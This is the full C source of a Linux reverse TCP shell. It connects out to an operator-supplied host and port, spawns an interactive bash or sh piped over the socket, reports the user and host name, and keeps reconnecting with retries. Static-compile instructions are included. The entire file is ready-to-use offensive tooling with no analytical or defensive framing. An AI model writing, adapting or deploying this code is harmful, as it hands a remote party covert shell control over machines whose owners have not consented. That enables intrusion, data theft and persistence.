/**
 * Reverse TCP Shell - Linux/Unix (LAN/WAN Support) with Interactive Shell
 * Compile: 
 *   Linux: gcc -o reverse_shell reverse_tcp.c -static
 *   Cross: x86_64-linux-musl-gcc -static -o reverse_shell_x64 reverse_tcp.c
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/select.h>
#include <signal.h>
#include <errno.h>
#include <fcntl.h>

#define BUFFER_SIZE 1024
#define MAX_COMMAND_SIZE 4096

// Function to set socket non-blocking
int set_nonblocking(int sockfd) {
    int flags = fcntl(sockfd, F_GETFL, 0);
    if (flags == -1) return -1;
    return fcntl(sockfd, F_SETFL, flags | O_NONBLOCK);
}

// Function to create and connect socket
int create_connection(const char *host, int port) {
    int sockfd;
    struct sockaddr_in server_addr;
    struct hostent *he;
    
    // Create socket
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) {
        return -1;
    }
    
    // Configure server address
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(port);
    
    // Try to resolve hostname (supports both IP and hostname)
    if (inet_addr(host) == INADDR_NONE) {
        // Hostname resolution
        he = gethostbyname(host);
        if (he == NULL) {
            close(sockfd);
            return -1;
        }
        memcpy(&server_addr.sin_addr, he->h_addr_list[0], he->h_length);
    } else {
        // Direct IP address
        server_addr.sin_addr.s_addr = inet_addr(host);
    }
    
    // Connect to server
    if (connect(sockfd, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
        close(sockfd);
        return -1;
    }
    
    return sockfd;
}

// Interactive shell function
void interactive_shell(int sockfd) {
    fd_set readfds;
    char buffer[BUFFER_SIZE];
    char command[MAX_COMMAND_SIZE];
    int nbytes;
    int shell_pid, pipe_stdin[2], pipe_stdout[2];
    
    // Create pipes for shell communication
    if (pipe(pipe_stdin) < 0 || pipe(pipe_stdout) < 0) {
        return;
    }
    
    // Fork for shell process
    shell_pid = fork();
    if (shell_pid == 0) {
        // Child process (shell)
        close(pipe_stdin[1]);  // Close write end of stdin pipe
        close(pipe_stdout[0]); // Close read end of stdout pipe
        
        // Redirect stdin/stdout/stderr to pipes
        dup2(pipe_stdin[0], STDIN_FILENO);
        dup2(pipe_stdout[1], STDOUT_FILENO);
        dup2(pipe_stdout[1], STDERR_FILENO);
        
        // Close original pipe ends
        close(pipe_stdin[0]);
        close(pipe_stdout[1]);
        
        // Execute shell based on available shells
        char *shells[] = {"/bin/bash", "/bin/sh", "/bin/ksh", "/bin/zsh", NULL};
        for (int i = 0; shells[i] != NULL; i++) {
            if (access(shells[i], X_OK) == 0) {
                execl(shells[i], shells[i], "-i", NULL);
                // If execl fails, try next shell
            }
        }
        
        // If no shell found, exit
        exit(1);
    } else if (shell_pid > 0) {
        // Parent process
        close(pipe_stdin[0]);  // Close read end of stdin pipe
        close(pipe_stdout[1]); // Close write end of stdout pipe
        
        // Set sockets non-blocking for better performance
        set_nonblocking(sockfd);
        set_nonblocking(pipe_stdout[0]);
        
        // Send initial message
        char banner[256];
        snprintf(banner, sizeof(banner), 
                 "\n[+] Reverse Shell Connected\n"
                 "[+] PID: %d\n"
                 "[+] User: %s\n"
                 "[+] Host: %s\n"
                 "[+] Interactive Shell Ready\n\n",
                 getpid(), getenv("USER") ?: "unknown", 
                 getenv("HOSTNAME") ?: "unknown");
        send(sockfd, banner, strlen(banner), 0);
        
        // Send shell prompt
        char prompt[128];
        snprintf(prompt, sizeof(prompt), "shell@%s:$ ", getenv("HOSTNAME") ?: "unknown");
        send(sockfd, prompt, strlen(prompt), 0);
        
        while (1) {
            FD_ZERO(&readfds);
            FD_SET(sockfd, &readfds);
            FD_SET(pipe_stdout[0], &readfds);
            
            // Use select to monitor multiple file descriptors
            int max_fd = (sockfd > pipe_stdout[0]) ? sockfd : pipe_stdout[0];
            int activity = select(max_fd + 1, &readfds, NULL, NULL, NULL);
            
            if (activity < 0) {
                if (errno == EINTR) continue;
                break;
            }
            
            // Data from network (client sending commands)
            if (FD_ISSET(sockfd, &readfds)) {
                nbytes = recv(sockfd, buffer, sizeof(buffer) - 1, 0);
                if (nbytes <= 0) {
                    break; // Connection closed
                }
                
                buffer[nbytes] = '\0';
                
                // Handle special commands
                if (strncmp(buffer, "cd ", 3) == 0) {
                    // Change directory command
                    char *path = buffer + 3;
                    path[strcspn(path, "\r\n")] = '\0'; // Remove newline
                    
                    if (chdir(path) == 0) {
                        char success_msg[256];
                        snprintf(success_msg, sizeof(success_msg), 
                                 "Changed directory to: %s\n", getcwd(NULL, 0));
                        send(sockfd, success_msg, strlen(success_msg), 0);
                    } else {
                        send(sockfd, "Failed to change directory\n", 27, 0);
                    }
                    
                    // Send new prompt
                    char new_prompt[128];
                    char cwd[256];
                    getcwd(cwd, sizeof(cwd));
                    snprintf(new_prompt, sizeof(new_prompt), "shell@%s:%s$ ", 
                             getenv("HOSTNAME") ?: "unknown", cwd);
                    send(sockfd, new_prompt, strlen(new_prompt), 0);
                } else if (strcmp(buffer, "exit\n") == 0 || strcmp(buffer, "quit\n") == 0) {
                    // Exit shell
                    break;
                } else if (strncmp(buffer, "download ", 9) == 0) {
                    // Simple file download simulation
                    send(sockfd, "[!] Download feature not implemented in this version\n", 51, 0);
                    char new_prompt[128];
                    snprintf(new_prompt, sizeof(new_prompt), "shell@%s:$ ", 
                             getenv("HOSTNAME") ?: "unknown");
                    send(sockfd, new_prompt, strlen(new_prompt), 0);
                } else {
                    // Regular command - send to shell
                    write(pipe_stdin[1], buffer, nbytes);
                }
            }
            
            // Data from shell (command output)
            if (FD_ISSET(pipe_stdout[0], &readfds)) {
                nbytes = read(pipe_stdout[0], buffer, sizeof(buffer) - 1);
                if (nbytes <= 0) {
                    break; // Shell died
                }
                
                buffer[nbytes] = '\0';
                send(sockfd, buffer, nbytes, 0);
            }
        }
        
        // Cleanup
        close(pipe_stdin[1]);
        close(pipe_stdout[0]);
        kill(shell_pid, SIGTERM);
        waitpid(shell_pid, NULL, 0);
    }
}

// Main function with reconnection logic
int main(int argc, char *argv[]) {
    char *host = "127.0.0.1";
    int port = 4444;
    int reconnect_delay = 5;
    int max_retries = 10;
    
    // Parse command line arguments
    if (argc > 1) host = argv[1];
    if (argc > 2) port = atoi(argv[2]);
    if (argc > 3) reconnect_delay = atoi(argv[3]);
    if (argc > 4) max_retries = atoi(argv[4]);
    
    printf("[*] Starting Reverse Shell\n");
    printf("[*] Target: %s:%d\n", host, port);
    printf("[*] Reconnect delay: %d seconds\n", reconnect_delay);
    printf("[*] Max retries: %d\n", max_retries);
    
    int retries = 0;
    
    while (retries < max_retries || max_retries == 0) {
        int sockfd = create_connection(host, port);
        
        if (sockfd >= 0) {
            printf("[+] Connected to %s:%d\n", host, port);
            printf("[+] Starting interactive shell...\n");
            
            interactive_shell(sockfd);
            
            close(sockfd);
            printf("[!] Connection closed, reconnecting...\n");
        } else {
            printf("[-] Failed to connect to %s:%d\n", host, port);
        }
        
        if (max_retries > 0) {
            retries++;
            if (retries >= max_retries) {
                printf("[-] Max retries reached. Exiting.\n");
                break;
            }
        }
        
        printf("[*] Retrying in %d seconds... (%d/%d)\n", 
               reconnect_delay, retries, max_retries);
        sleep(reconnect_delay);
    }
    
    return 0;
}
